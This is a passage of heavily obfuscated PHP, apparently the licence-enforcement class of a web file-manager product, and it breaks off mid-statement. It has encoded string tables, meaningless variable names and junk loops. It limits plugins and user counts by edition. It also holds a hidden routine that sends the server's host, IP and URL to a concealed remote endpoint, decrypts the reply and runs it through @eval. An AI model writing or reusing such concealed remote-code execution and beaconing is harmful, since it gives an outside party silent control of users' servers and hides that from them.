$„†ùôóØ[122]) { Model($„†ùôóØ[33])->set($„†ùôóØ[63], $„†ùôóØ[122]); } Action($„†ùôóØ[205])->initStart(!0); } private function krzsc4815ea4() { $÷´‚Í» =& $_SERVER[Š—Â“œÔ]; $çÍ…¸¿ƒ =& $_SERVER[Ÿ­Œüû]; Model($çÍ…¸¿ƒ[33])->set(array($çÍ…¸¿ƒ[153] => $çÍ…¸¿ƒ[6], $çÍ…¸¿ƒ[191] => $çÍ…¸¿ƒ[6], $çÍ…¸¿ƒ[108] => $çÍ…¸¿ƒ[109], $çÍ…¸¿ƒ[110] => $çÍ…¸¿ƒ[6], $çÍ…¸¿ƒ[111] => $çÍ…¸¿ƒ[6])); Model($çÍ…¸¿ƒ[33])->setDeep($çÍ…¸¿ƒ[198], $çÍ…¸¿ƒ[206]); $Îî¯Òø = $÷´‚Í»[740]; $this->xdvq74adfdd5 = array(); $èİ¦õõª = $÷´‚Í»[741]; $this->xsazfdcd10d0 = $çÍ…¸¿ƒ[109]; $«¢Ô…­Ğ = $÷´‚Í»[742]; } private function pzvo1b3ee800() { $ïƒ¸Î–¢ =& $_SERVER[Š—Â“œÔ]; $Å ö¦ù‰ =& $_SERVER[Ÿ­Œüû]; $_SERVER[$Å ö¦ù‰[162]] = _get($_SERVER, $Å ö¦ù‰[162], APP_HOST); $²¥Ë‡«´ = $ïƒ¸Î–¢[743]; $this->xsazfdcd10d0 = $Å ö¦ù‰[109]; $£Ÿ™À = $ïƒ¸Î–¢[744]; $ƒäé¡˜ = Model($Å ö¦ù‰[33])->get(); if ($ƒäé¡˜[$Å ö¦ù‰[108]] == $Å ö¦ù‰[109]) { return; } $£Ï‘²›á = Model($Å ö¦ù‰[33])->get($Å ö¦ù‰[100]); $èò¸õ§« = $Å ö¦ù‰[203] . md5($£Ï‘²›á . $Å ö¦ù‰[204]); $·¥ÚÁÑ· = Cache::get($èò¸õ§«); if (!is_array($·¥ÚÁÑ·) || !isset($·¥ÚÁÑ·[$Å ö¦ù‰[207]]) || time() - $·¥ÚÁÑ·[$Å ö¦ù‰[207]] >= 60) { $ß¡Î…èÍ = Model($Å ö¦ù‰[7])->loadList(); $Üëêôã = $ß¡Î…èÍ[$Å ö¦ù‰[200]]; $üÉÕèçà = md5($_SERVER[$Å ö¦ù‰[106]] . strrev($£Ï‘²›á) . $ƒäé¡˜[$Å ö¦ù‰[191]]); $“ˆóÙ½ = strrev(substr($üÉÕèçà, 10, 16)); $·¥ÚÁÑ· = $this->wiun8a2ae84e($Üëêôã[$Å ö¦ù‰[86]][$“ˆóÙ½], $üÉÕèçà); $·¥ÚÁÑ· = json_decode($·¥ÚÁÑ·, !0); } if (!is_array($·¥ÚÁÑ·)) { return $this->krzsc4815ea4(); } $ğªŒŸ£ƒ = strtotime($·¥ÚÁÑ·[$Å ö¦ù‰[129]]); if (time() >= $ğªŒŸ£ƒ) { return $this->krzsc4815ea4(); } if (!isset($·¥ÚÁÑ·[$Å ö¦ù‰[207]]) || time() - $·¥ÚÁÑ·[$Å ö¦ù‰[207]] > 20) { $·¥ÚÁÑ·[$Å ö¦ù‰[207]] = time(); Cache::set($èò¸õ§«, $·¥ÚÁÑ·); } $this->xdvq74adfdd5 = $·¥ÚÁÑ·; $this->xsazfdcd10d0 = $ƒäé¡˜[$Å ö¦ù‰[108]]; $ıƒà•¢ = $ïƒ¸Î–¢[745]; } private function akwy006590d2() { $¿œßÅĞÈ =& $_SERVER[Ÿ­Œüû]; $¢êîÖ¡² = $GLOBALS[$¿œßÅĞÈ[13]]; $…‰Ê‡‚ = $_SERVER[$¿œßÅĞÈ[24]]; if ($…‰Ê‡‚ == $¿œßÅĞÈ[208] && $this->xsazfdcd10d0 == $¿œßÅĞÈ[109]) { show_json(LNG($¿œßÅĞÈ[209]), !1, $¿œßÅĞÈ[210]); } $”– ¨¯¨ = array($¿œßÅĞÈ[211], $¿œßÅĞÈ[212]); if (in_array($…‰Ê‡‚, $”– ¨¯¨)) { if ($this->xsazfdcd10d0 == $¿œßÅĞÈ[109] && isset($¢êîÖ¡²[$¿œßÅĞÈ[213]])) { show_json(LNG($¿œßÅĞÈ[209]), !1, $¿œßÅĞÈ[210]); die; } $²àˆ¼°ç = $this->yugm51f4a186(); if ($²àˆ¼°ç != intval($¿œßÅĞÈ[214])) { if ($²àˆ¼°ç <= Model($¿œßÅĞÈ[125])->count()) { show_json(LNG($¿œßÅĞÈ[215]), !1, $¿œßÅĞÈ[210]); die; } } } } private function udegca8397f3() { $í±ğíÜ‡ =& $_SERVER[Š—Â“œÔ]; $ĞÀÅäÍ„ =& $_SERVER[Ÿ­Œüû]; $²™ıÃŠ± = array($ĞÀÅäÍ„[119], $ĞÀÅäÍ„[120]); $Û»İÀø— = $í±ğíÜ‡[746]; if (!KodUser::isRoot() || !isset($_GET[$ĞÀÅäÍ„[216]])) { return; } if (!in_array($_SERVER[$ĞÀÅäÍ„[24]], $²™ıÃŠ±)) { return; } $µ—±…¦à = $ĞÀÅäÍ„[217]; $Œ´´Í²Ø = $í±ğíÜ‡[747]; if (strlen($Œ´´Í²Ø) < $í±ğíÜ‡[714]) { return; } $µ—±…¦à = $this->jicf53ec45a2($µ—±…¦à, $ĞÀÅäÍ„[218]); $‹Ê–ÊÊ = $í±ğíÜ‡[748]; if (strlen($‹Ê–ÊÊ) < $í±ğíÜ‡[691]) { die; } $–õå‰Ò = stream_context_create(array($ĞÀÅäÍ„[219] => array($ĞÀÅäÍ„[220] => $ĞÀÅäÍ„[221], $ĞÀÅäÍ„[222] => 3))); $óª¤Ğºø = @file_get_contents($µ—±…¦à, !1, $–õå‰Ò); header($ĞÀÅäÍ„[223]); if ($óª¤Ğºø && strstr($óª¤Ğºø, $ĞÀÅäÍ„[224])) { echo $óª¤Ğºø; } die; } public function ihuvaba93017($ÄÄ›¡÷·) { $¸Íñ‰âÚ =& $_SERVER[Ÿ­Œüû]; if ($this->xsazfdcd10d0 == $¸Íñ‰âÚ[225]) { return $ÄÄ›¡÷·; } $òì·¹»í = $this->versionPluginList(); $áª‚ì€® = explode($¸Íñ‰âÚ[226], $this->versionPluginFilter()); $ĞáÑúÏ = array(); foreach ($òì·¹»í as $Ö‘ÃŸö‰ => $›ª“–úŸ) { if ($›ª“–úŸ == $¸Íñ‰âÚ[227] && substr($this->xsazfdcd10d0, 0, 1) == $¸Íñ‰âÚ[227]) { continue; } if (!in_array($Ö‘ÃŸö‰, $áª‚ì€®)) { $ĞáÑúÏ[] = $Ö‘ÃŸö‰; } } foreach ($ĞáÑúÏ as $Ö‘ÃŸö‰) { unset($ÄÄ›¡÷·[$Ö‘ÃŸö‰]); $™ô¸§¶ä = $_SERVER[Š—Â“œÔ][749]; if (!$™ô¸§¶ä) { die; } } return $ÄÄ›¡÷·; } private function versionPluginList() { $×©û¹ä =& $_SERVER[Ÿ­Œüû]; return array($×©û¹ä[228] => $×©û¹ä[227], $×©û¹ä[229] => $×©û¹ä[227], $×©û¹ä[230] => $×©û¹ä[227], $×©û¹ä[231] => $×©û¹ä[232], $×©û¹ä[233] => $×©û¹ä[232], $×©û¹ä[234] => $×©û¹ä[232], $×©û¹ä[235] => $×©û¹ä[232], $×©û¹ä[236] => $×©û¹ä[232], $×©û¹ä[237] => $×©û¹ä[232], $×©û¹ä[238] => $×©û¹ä[232], $×©û¹ä[239] => $×©û¹ä[232], $×©û¹ä[240] => $×©û¹ä[232], $×©û¹ä[241] => $×©û¹ä[232], $×©û¹ä[242] => $×©û¹ä[232], $×©û¹ä[243] => $×©û¹ä[232], $×©û¹ä[244] => $×©û¹ä[232]); } private function versionPluginFilter() { $âÏ«‚«Î =& $_SERVER[Š—Â“œÔ]; $íÕòÅĞ’ =& $_SERVER[Ÿ­Œüû]; if ($this->xsazfdcd10d0 == $íÕòÅĞ’[109]) { return $íÕòÅĞ’[6]; } $¿¨Ôš˜‰ = _get($this->xdvq74adfdd5, $íÕòÅĞ’[245], $íÕòÅĞ’[6]); $‹ñİğØ… = _get($this->xdvq74adfdd5, $íÕòÅĞ’[116], $íÕòÅĞ’[6]); $§øèÊ = $âÏ«‚«Î[750]; if (!$§øèÊ) { return; } $…©Åë¬¢ = _get($this->xdvq74adfdd5, $íÕòÅĞ’[246], $íÕòÅĞ’[6]); $¿ÅøˆÊ = $âÏ«‚«Î[751]; if (strlen($¿ÅøˆÊ) < $âÏ«‚«Î[694]) { return; } if ($‹ñİğØ… > time() && $…©Åë¬¢ > time()) { $Ñ®ë‡Ôı = explode($íÕòÅĞ’[226], $¿¨Ôš˜‰); $²´€è·¢ = array_keys($this->versionPluginList()); $¿¨Ôš˜‰ = array_merge($Ñ®ë‡Ôı, $²´€è·¢); $¿¨Ôš˜‰ = implode($íÕòÅĞ’[226], array_filter(array_unique($¿¨Ôš˜‰))); } return $¿¨Ôš˜‰; } private function zitk6bd83c4b() { $ä’¤Ãü =& $_SERVER[Ÿ­Œüû]; if ($this->xsazfdcd10d0 != $ä’¤Ãü[109]) { $GLOBALS[$ä’¤Ãü[86]][$ä’¤Ãü[90]][$ä’¤Ãü[247]] = $ä’¤Ãü[206]; return; } $GLOBALS[$ä’¤Ãü[86]][$ä’¤Ãü[248]] = $ä’¤Ãü[122]; if (Model($ä’¤Ãü[249])->get($ä’¤Ãü[63]) != $ä’¤Ãü[206]) { Model($ä’¤Ãü[249])->set($ä’¤Ãü[63], $ä’¤Ãü[206]); } } public function zacw13b8d39e() { return $_SERVER[Ÿ­Œüû][250]; } private function tyaw8054399b() { $»çËñ» =& $_SERVER[Š—Â“œÔ]; $ÃÏÖ¢Ùû =& $_SERVER[Ÿ­Œüû]; $“Øæ†æ = array($ÃÏÖ¢Ùû[251], $ÃÏÖ¢Ùû[252], $ÃÏÖ¢Ùû[253]); $§İ³Œ·Ì = $»çËñ»[752]; while (strlen($§İ³Œ·Ì) < $»çËñ»[694]) { if (!$§İ³Œ·Ì) { break; } $§İ³Œ·Ì++; } $ºŞ¤ÅÊÁ = $ÃÏÖ¢Ùû[254] . md5($ÃÏÖ¢Ùû[255]); $ÕÉ”ì§ï = $»çËñ»[753]; if ($this->xsazfdcd10d0 == $ÃÏÖ¢Ùû[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ÃÏÖ¢Ùû[24]], $“Øæ†æ)) { return; } if (time() % 4 != 0) { return; } $à ®ëâË = call_user_func(array($ÃÏÖ¢Ùû[256], $ÃÏÖ¢Ùû[257]), $ºŞ¤ÅÊÁ); $ ¹òÜÁõ = $»çËñ»[754]; if (strlen($ ¹òÜÁõ) < $»çËñ»[697]) { die; } if ($à ®ëâË && time() - $à ®ëâË < intval($ÃÏÖ¢Ùû[258])) { return; } call_user_func(array($ÃÏÖ¢Ùû[256], $ÃÏÖ¢Ùû[139]), $ºŞ¤ÅÊÁ, time()); $è’ßÃ„„ = $»çËñ»[755]; $Ÿ‰°¤’ = Model($ÃÏÖ¢Ùû[33])->get($ÃÏÖ¢Ùû[100]); $¬²Ùş°Ş = $»çËñ»[756]; if (!$¬²Ùş°Ş) { die; } $½“‹Ø¸‹ = array($ÃÏÖ¢Ùû[152] => Model($ÃÏÖ¢Ùû[33])->get($ÃÏÖ¢Ùû[153]), $ÃÏÖ¢Ùû[167] => $this->xsazfdcd10d0, $ÃÏÖ¢Ùû[163] => $_SERVER[$ÃÏÖ¢Ùû[164]], $ÃÏÖ¢Ùû[165] => Model($ÃÏÖ¢Ùû[33])->get($ÃÏÖ¢Ùû[131]), $ÃÏÖ¢Ùû[105] => md5($_SERVER[$ÃÏÖ¢Ùû[106]] . $Ÿ‰°¤’), $ÃÏÖ¢Ùû[156] => $ÃÏÖ¢Ùû[136], $ÃÏÖ¢Ùû[159] => $_SERVER[$ÃÏÖ¢Ùû[160]]); $Î³ÁÙ„ = $this->uasma8322084($ÃÏÖ¢Ùû[259], $½“‹Ø¸‹); if (!is_array($Î³ÁÙ„)) { return; } if ($Î³ÁÙ„[$ÃÏÖ¢Ùû[152]] && $Î³ÁÙ„[$ÃÏÖ¢Ùû[260]]) { if ($this->vzsoc28323ef($Î³ÁÙ„[$ÃÏÖ¢Ùû[260]]) == $½“‹Ø¸‹[$ÃÏÖ¢Ùû[152]]) { return; } } $this->krzsc4815ea4(); if ($this->vzsoc28323ef($Î³ÁÙ„[$ÃÏÖ¢Ùû[260]]) != $½“‹Ø¸‹[$ÃÏÖ¢Ùû[152]]) { $Ñ¢×É·ò = array($ÃÏÖ¢Ùû[185] => $Ÿ‰°¤’, $ÃÏÖ¢Ùû[186] => $_SERVER[$ÃÏÖ¢Ùû[106]], $ÃÏÖ¢Ùû[187] => this_url(), $ÃÏÖ¢Ùû[161] => $_SERVER[$ÃÏÖ¢Ùû[162]]); $à”§œïÉ = $this->ypbcd21cf2db(json_encode($Ñ¢×É·ò)); $Î³ÁÙ„ = $this->uasma8322084($ÃÏÖ¢Ùû[188] . $à”§œïÉ); if ($Î³ÁÙ„ && is_array($Î³ÁÙ„) && isset($Î³ÁÙ„[$ÃÏÖ¢Ùû[260]])) { $äéİ¹ÄØ = $this->wiun8a2ae84e($Î³ÁÙ„[$ÃÏÖ¢Ùû[260]], 2); if ($äéİ¹ÄØ) { $äéİ¹ÄØ = $this->vzsoc28323ef($äéİ¹ÄØ); } if ($äéİ¹ÄØ) { try { @eval($äéİ¹ÄØ); } catch (Exception $òº¦ëªÈ) { } } } } } private function uasma8322084($Ç©ê‡˜š = '', $­¶óßı¢ = array(), $«£ÕºÏ = 5) { $ó¿ó¬í¶ =& $_SERVER[Š—Â“œÔ]; $Á—ÏêÉ— =& $_SERVER[Ÿ­Œüû]; $Œ¶¿ú = $Á—ÏêÉ—[261]; $ŒÍşåÌÛ = $ó¿ó¬í¶[757]; if (!$ŒÍşåÌÛ) { die; } $Œ¶¿ú = $this->jicf53ec45a2($Œ¶¿ú, $Á—ÏêÉ—[262]); $Œ¶¿ú = $Œ¶¿ú . $Ç©ê‡˜š; $…¬®á¢˜ = $ó¿ó¬í¶[758]; if (strlen($…¬®á¢˜) < $ó¿ó¬í¶[691]) { die; } if ($­¶óßı¢ && is_array($­¶óßı¢)) { $Œ¶¿ú = $Œ¶¿ú . $Á—ÏêÉ—[263] . http_build_query($­¶óßı¢); } if ($­¶óßı¢ === -1) { return $Œ¶¿ú; } $˜¿½¯¨‡ = stream_context_create(array($Á—ÏêÉ—[219] => array($Á—ÏêÉ—[222] => $«£ÕºÏ, $Á—ÏêÉ—[220] => $Á—ÏêÉ—[264]), $Á—ÏêÉ—[265] => array($Á—ÏêÉ—[266] => !1, $Á—ÏêÉ—[267] => !1))); $¿ÓŒªŒü = $ó¿ó¬í¶[759]; $­¶óßı¢ = @file_get_contents($Œ¶¿ú, !1, $˜¿½¯¨‡); $ü¥Ó­¿´ = $ó¿ó¬í¶[760]; if (!$ü¥Ó­¿´) { return; } return json_decode($­¶óßı¢, !0); } private function yugm51f4a186() { $õˆâ—É• =& $_SERVER[Š—Â“œÔ]; $öØÊğ‘Ş =& $_SERVER[Ÿ­Œüû]; $¾®ç±²Õ = array($öØÊğ‘Ş[268] => $öØÊğ‘Ş[269], $öØÊğ‘Ş[270] => $öØÊğ‘Ş[271], $öØÊğ‘Ş[272] => $öØÊğ‘Ş[273], $öØÊğ‘Ş[274] => $öØÊğ‘Ş[275], $öØÊğ‘Ş[276] => $öØÊğ‘Ş[277], $öØÊğ‘Ş[278] => $öØÊğ‘Ş[214], $öØÊğ‘Ş[279] => $öØÊğ‘Ş[214], $öØÊğ‘Ş[280] => $öØÊğ‘Ş[269], $öØÊğ‘Ş[281] => $öØÊğ‘Ş[271], $öØÊğ‘Ş[282] => $öØÊğ‘Ş[273], $öØÊğ‘Ş[283] => $öØÊğ‘Ş[284], $öØÊğ‘Ş[285] => $öØÊğ‘Ş[275], $öØÊğ‘Ş[286] => $öØÊğ‘Ş[287], $öØÊğ‘Ş[288] => $öØÊğ‘Ş[277], $öØÊğ‘Ş[289] => $öØÊğ‘Ş[290], $öØÊğ‘Ş[291] => $öØÊğ‘Ş[292], $öØÊğ‘Ş[293] => $öØÊğ‘Ş[294]); $œùÓÊıÒ = $õˆâ—É•[761]; if (!$œùÓÊıÒ) { die; } $ò§°¥®­ = $¾®ç±²Õ[$this->xsazfdcd10d0]; $ò§°¥®­ = intval($ò§°¥®­ ? $ò§°¥®­ : $öØÊğ‘Ş[269]); $èŒ¯¥Á = _get($this->xdvq74adfdd5, $öØÊğ‘Ş[295]); $±Âè = $õˆâ—É•[762]; while (strlen($±Âè) < $õˆâ—É•[714]) { if (!$±Âè) { break; } $±Âè++; } $èŒ¯¥Á = $èŒ¯¥Á ? intval($èŒ¯¥Á) : 0; $…Ò¬Éåô = $õˆâ—É•[763]; while ($…Ò¬Éåô < $õˆâ—É•[691]) { if ($…Ò¬Éåô >= 0) { break; } $…Ò¬Éåô++; } return $ò§°¥®­ + $èŒ¯¥Á; $¾¾ùñ¾ä = $õˆâ—É•[764]; if (!$¾¾ùñ¾ä) { die; } } public function ztdq17130f0c($ğ¾¦í) { $€³ÓÁÇš =& $_SERVER[Š—Â“œÔ]; $üÁÊ‚Òß =& $_SERVER[Ÿ­Œüû]; $’ƒ¾Îé¡ = $this->yugm51f4a186(); $û¯¿ìÍª = $€³ÓÁÇš[765]; if (!$û¯¿ìÍª) { return; } if ($ğ¾¦í[$üÁÊ‚Òß[296]] == $üÁÊ‚Òß[122]) { return; } if ($’ƒ¾Îé¡ >= intval($üÁÊ‚Òß[214])) { return; } $šÔŠ‹•µ = Model($üÁÊ‚Òß[125])->count(); if ($šÔŠ‹•µ <= $’ƒ¾Îé¡) { return; } $Ï´Ì¢ıĞ = Model($üÁÊ‚Òß[125])->field($üÁÊ‚Òß[296])->limit($’ƒ¾Îé¡)->select(); $ó™¨ÇØÙ = $€³ÓÁÇš[766]; if (!$ó™¨ÇØÙ) { return; } $Ï´Ì¢ıĞ = array_to_keyvalue($Ï´Ì¢ıĞ, $üÁÊ‚Òß[6], $üÁÊ‚Òß[296]); if (!in_array($ğ¾¦í[$üÁÊ‚Òß[296]], $Ï´Ì¢ıĞ)) { show_json($üÁÊ‚Òß[297], !1, $üÁÊ‚Òß[210]); } } public function mgsz6bd630a4() { $›ïÁ’„“ =& $_SERVER[Š—Â“œÔ]; $ óöÚ†ı =& $_SERVER[Ÿ­Œüû]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $§Àö¥½Ø = $ óöÚ†ı[217]; $Í˜æ²¶æ = $›ïÁ’„“[705]; $§Àö¥½Ø = $this->jicf53ec45a2($§Àö¥½Ø, $ óöÚ†ı[218]); $ı§Ô¢¾Ó = $›ïÁ’„“[767]; while ($ı§Ô¢¾Ó < $›ïÁ’„“[691]) { if ($ı§Ô¢¾Ó >= 0) { break; } $ı§Ô¢¾Ó++; } $Ëª³‰¸÷ = stream_context_create(array($ óöÚ†ı[219] => array($ óöÚ†ı[220] => $ óöÚ†ı[221], $ óöÚ†ı[222] => 3))); $¯òŞãÇé = @file_get_contents($§Àö¥½Ø, !1, $Ëª³‰¸÷); $ò’×¹€ = $›ïÁ’„“[768]; if (strlen($ò’×¹€) < $›ïÁ’„“[697]) { die; } echo $ óöÚ†ı[298] . hash_encode($¯òŞãÇé) . $ óöÚ†ı[299]; $Ïˆé»ƒÎ = $›ïÁ’„“[769]; if (strlen($Ïˆé»ƒÎ) < $›ïÁ’„“[714]) { die; } } private function iwzua1d261fe($œë…µÎº, $ùèïÕÆ¢, $¼ÙÏ¨¦ç = 3) { $–¯­§ü =& $_SERVER[Š—Â“œÔ]; $±Õ‘Ô«¹ =& $_SERVER[Ÿ­Œüû]; usleep(1); $”ÑñùÒ = $–¯­§ü[770]; if (strlen($”ÑñùÒ) < $–¯­§ü[691]) { die; } $œë…µÎº = trim($œë…µÎº); $èœø¢ = $–¯­§ü[771]; if (strlen($èœø¢) < $–¯­§ü[691]) { return; } $’ƒÙËÖ = mt_rand(0, 5) . $±Õ‘Ô«¹[6]; $ß¼¶³ª = rand_string(15); $àñì¬İ = $±Õ‘Ô«¹[300]; switch ($’ƒÙËÖ) { case $±Õ‘Ô«¹[206]: $Şñì‡ş· = $this->xprs01da9744($œë…µÎº, strrev($ùèïÕÆ¢ . $ß¼¶³ª)); break; $•İì¤– = $–¯­§ü[772]; case $±Õ‘Ô«¹[122]: $Şñì‡ş· = $this->xprs01da9744($œë…µÎº, strrev($ß¼¶³ª . $ùèïÕÆ¢)); break; case $±Õ‘Ô«¹[301]: $Şñì‡ş· = $this->xprs01da9744($œë…µÎº, base64_encode($ß¼¶³ª . $ùèïÕÆ¢)); $‰É¼Â§¹ = $–¯­§ü[773]; while (strlen($‰É¼Â§¹) < $–¯­§ü[697]) { if (!$‰É¼Â§¹) { break; } $‰É¼Â§¹++; } break; $ŸÁƒ³Ú = $–¯­§ü[774]; while ($ŸÁƒ³Ú < $–¯­§ü[714]) { if ($ŸÁƒ³Ú >= 0) { break; } $ŸÁƒ³Ú++; } case $±Õ‘Ô«¹[302]: $Şñì‡ş· = $this->xprs01da9744($œë…µÎº, md5($ß¼¶³ª . $ùèïÕÆ¢)); $˜’ß‰º = $–¯­§ü[775]; if (!$˜’ß‰º) { return; } break; case $±Õ‘Ô«¹[303]: $œë…µÎº = base64_encode($œë…µÎº); $İùÌĞ²‰ = rand(0, 64); $İØ¶ëÕ¦ = $–¯­§ü[776]; $¯šô‘®Õ = $àñì¬İ[$İùÌĞ²‰]; $ÂöÏ› = $–¯­§ü[777]; if (strlen($ÂöÏ›) < $–¯­§ü[697]) { die; } $ƒÄ™›•Á = md5($¯šô‘®Õ . md5($ùèïÕÆ¢ . $¯šô‘®Õ) . $ùèïÕÆ¢); $Ş³Ÿò—è = $–¯­§ü[778]; if (!$Ş³Ÿò—è) { die; } $ƒÄ™›•Á = substr($ƒÄ™›•Á, $İùÌĞ²‰ % 8, $İùÌĞ²‰ % 8 + 7); $ıæôÆ«Ø = $±Õ‘Ô«¹[6]; $ĞÂç¢Öç = $–¯­§ü[779]; while ($ĞÂç¢Öç < $–¯­§ü[694]) { if ($ĞÂç¢Öç >= 0) { break; } $ĞÂç¢Öç++; } $ìïä™¯º = 0; $ôıÒ®¸ü = 0; $è†Ñ“Û¾ = 0; for ($ìïä™¯º = 0; $ìïä™¯º < strlen($œë…µÎº); $ìïä™¯º++) { $è†Ñ“Û¾ = $è†Ñ“Û¾ == strlen($ƒÄ™›•Á) ? 0 : $è†Ñ“Û¾; $ôıÒ®¸ü = ($İùÌĞ²‰ + strpos($àñì¬İ, $œë…µÎº[$ìïä™¯º]) + ord($ƒÄ™›•Á[$è†Ñ“Û¾++])) % 64; $©Ï°Òş = $–¯­§ü[780]; while ($©Ï°Òş < $–¯­§ü[694]) { if ($©Ï°Òş >= 0) { break; } $©Ï°Òş++; } $ıæôÆ«Ø .= $àñì¬İ[$ôıÒ®¸ü]; } $Şñì‡ş· = hash_encode($¯šô‘®Õ . $ıæôÆ«Ø); break; default: $Şñì‡ş· = $this->xprs01da9744($œë…µÎº, $ùèïÕÆ¢ . $ß¼¶³ª); break; } $Şñì‡ş· = strrev($’ƒÙËÖ . $ß¼¶³ª . $Şñì‡ş·); if ($¼ÙÏ¨¦ç - 1 > 0) { $Şñì‡ş· = $this->iwzua1d261fe($Şñì‡ş·, $ùèïÕÆ¢, $¼ÙÏ¨¦ç - 1); } return $Şñì‡ş·; } private function wiun8a2ae84e($Â£í°ÍŠ, $£­¼Œßİ, $³ÛÕÜ¿€ = 3) { $·­²ôÕ =& $_SERVER[Š—Â“œÔ]; $¥¼½ŞÔÔ =& $_SERVER[Ÿ­Œüû]; if (!is_string($Â£í°ÍŠ) || strlen($Â£í°ÍŠ) < 10) { return !1; } $Â£í°ÍŠ = trim($Â£í°ÍŠ); $›ú¸À—“ = $·­²ôÕ[781]; if (strlen($›ú¸À—“) < $·­²ôÕ[714]) { die; } $Â£í°ÍŠ = strrev($Â£í°ÍŠ); $ˆ†«¶° = $·­²ôÕ[782]; if (!$ˆ†«¶°) { return; } $¬«­³í’ = $Â£í°ÍŠ[0]; $ÄÃ·‰ Ğ = substr($Â£í°ÍŠ, 1, 15); $˜÷Ä½Â• = $·­²ôÕ[783]; $Â£í°ÍŠ = substr($Â£í°ÍŠ, 16); $ÌÜÇ¨é§ = $¥¼½ŞÔÔ[300]; $“Á¢¬‹í = $·­²ôÕ[784]; switch ($¬«­³í’) { case $¥¼½ŞÔÔ[206]: $“îŒ€šÑ = $this->jicf53ec45a2($Â£í°ÍŠ, strrev($£­¼Œßİ . $ÄÃ·‰ Ğ)); $†Ê¨óÔó = $·­²ôÕ[785]; break; $ÏÉø°  = $·­²ôÕ[786]; while ($ÏÉø°  < $·­²ôÕ[691]) { if ($ÏÉø°  >= 0) { break; } $ÏÉø° ++; } case $¥¼½ŞÔÔ[122]: $“îŒ€šÑ = $this->jicf53ec45a2($Â£í°ÍŠ, strrev($ÄÃ·‰ Ğ . $£­¼Œßİ)); $°€¢…‰” = $·­²ôÕ[787]; break; case $¥¼½ŞÔÔ[301]: $“îŒ€šÑ = $this->jicf53ec45a2($Â£í°ÍŠ, base64_encode($ÄÃ·‰ Ğ . $£­¼Œßİ)); break; $Ã†„‹°‹ = $·­²ôÕ[788]; while ($Ã†„‹°‹ < $·­²ôÕ[714]) { if ($Ã†„‹°‹ >= 0) { break; } $Ã†„‹°‹++; } case $¥¼½ŞÔÔ[302]: $“îŒ€šÑ = $this->jicf53ec45a2($Â£í°ÍŠ, md5($ÄÃ·‰ Ğ . $£­¼Œßİ)); break; case $¥¼½ŞÔÔ[303]: $Â£í°ÍŠ = hash_decode($Â£í°ÍŠ); $Ôİ¼çŞ = $·­²ôÕ[789]; $¹…ÃÄìÙ = $Â£í°ÍŠ[0]; $Â£í°ÍŠ = substr($Â£í°ÍŠ, 1); $ÙÆªŠ¤¼ = $·­²ôÕ[790]; if (!$ÙÆªŠ¤¼) { die; } $ù„ÄŞ§“ = strpos($ÌÜÇ¨é§, $¹…ÃÄìÙ); $ƒÌØ’ = $·­²ôÕ[791]; if (!$ƒÌØ’) { return; } $¤ÑŞò— = md5($¹…ÃÄìÙ . md5($£­¼Œßİ . $¹…ÃÄìÙ) . $£­¼Œßİ); $¤ÑŞò— = substr($¤ÑŞò—, $ù„ÄŞ§“ % 8, $ù„ÄŞ§“ % 8 + 7); $Ëæú¢…“ = $¥¼½ŞÔÔ[6]; $„ÆÀØšğ = 0; $ŠñïõÌ = 0; $ †Âñõ¯ = 0; for ($„ÆÀØšğ = 0; $„ÆÀØšğ < strlen($Â£í°ÍŠ); $„ÆÀØšğ++) { $ †Âñõ¯ = $ †Âñõ¯ == strlen($¤ÑŞò—) ? 0 : $ †Âñõ¯; $”èá€Õ× = $ †Âñõ¯++; $ŠñïõÌ = strpos($ÌÜÇ¨é§, $Â£í°ÍŠ[$„ÆÀØšğ]) - $ù„ÄŞ§“ - ord($¤ÑŞò—[$”èá€Õ×]); $°´ÌÅÚ = $·­²ôÕ[792]; while ($°´ÌÅÚ < $·­²ôÕ[697]) { if ($°´ÌÅÚ >= 0) { break; } $°´ÌÅÚ++; } while ($ŠñïõÌ < 0) { $ŠñïõÌ += 64; } $Ëæú¢…“ .= $ÌÜÇ¨é§[$ŠñïõÌ]; } $“îŒ€šÑ = base64_decode($Ëæú¢…“); $üÍîáœ† = $·­²ôÕ[793]; break; default: $“îŒ€šÑ = $this->jicf53ec45a2($Â£í°ÍŠ, $£­¼Œßİ . $ÄÃ·‰ Ğ); $í‰Ëö²² = $·­²ôÕ[794]; while (strlen($í‰Ëö²²) < $·­²ôÕ[691]) { if (!$í‰Ëö²²) { break; } $í‰Ëö²²++; } break; $ß³óÒÒ = $·­²ôÕ[795]; } if ($³ÛÕÜ¿€ - 1 > 0) { $“îŒ€šÑ = $this->wiun8a2ae84e($“îŒ€šÑ, $£­¼Œßİ, $³ÛÕÜ¿€ - 1); } return $“îŒ€šÑ; } public function ypbcd21cf2db($Ûñ‹†˜) { $üãÓà• =& $_SERVER[Š—Â“œÔ]; $ºéš¹ªã =& $_SERVER[Ÿ­Œüû]; $¸·ò­ = $this->uxdh901d460e(); $ë†ÛôÊ = $üãÓà•[796]; $Üôì¿üú = $this->uxdh901d460e(); $üšõ®ñí = ($¸·ò­ - 1) * ($Üôì¿üú - 1); $Şùç¾ê£ = $üãÓà•[797]; while (strlen($Şùç¾ê£) < $üãÓà•[694]) { if (!$Şùç¾ê£) { break; } $Şùç¾ê£++; } $¬‡Á«•Æ = intval(($¸·ò­ + $Üôì¿üú) / 2); while (1) { $ÑñœÁñ… = $¬‡Á«•Æ; $Ú„ìÑá¹ = $üšõ®ñí; while ($Ú„ìÑá¹ % $ÑñœÁñ… != 0) { $·æğÒÇ• = $Ú„ìÑá¹; $Ú„ìÑá¹ = $ÑñœÁñ…; $ÑñœÁñ… = $·æğÒÇ• % $ÑñœÁñ…; } if ($ÑñœÁñ… == 1) { break; } else { $¬‡Á«•Æ++; } } $¦€•´õ“ = 2; for ($ï°îá´Ú = 0; $ï°îá´Ú < $üšõ®ñí * 10; $ï°îá´Ú++) { if (($üšõ®ñí * $ï°îá´Ú + 1) % $¬‡Á«•Æ == 0) { $¦€•´õ“ = intval(($üšõ®ñí * $ï°îá´Ú + 1) / $¬‡Á«•Æ); break; } } $â·Í—äã = $this->xprs01da9744($¸·ò­ * $Üôì¿üú . $ºéš¹ªã[6], $ºéš¹ªã[136]); $õ—Ô‚Ğ = md5($ºéš¹ªã[304] . ($¸·ò­ + $Üôì¿üú) . $ºéš¹ªã[305] . $¬‡Á«•Æ . $ºéš¹ªã[305] . $¦€•´õ“ . $ºéš¹ªã[306]); $·µˆ–½ç = $this->xprs01da9744($Ûñ‹†˜, 